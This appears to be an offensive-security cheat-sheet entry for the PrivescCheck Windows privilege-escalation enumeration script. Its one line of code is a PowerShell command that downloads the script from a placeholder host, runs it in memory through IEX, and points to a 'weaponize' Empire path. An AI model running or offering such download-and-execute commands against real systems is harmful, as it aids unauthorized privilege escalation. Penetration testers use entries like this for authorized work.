# PrivescCheck

#plateform/windows #target/local #cat/RECON #tag/powershell
## onliner
```powershell
(new-object system.net.webclient).downloadstring('http://<local_ip>:<port|80>/<dl_privesccheck_path>PrivescCheck.ps1') | IEX; Invoke-PrivescCheck -Extended
```
= dl_privesccheck_path: windows/windows_weaponize/ps/empire/privesc/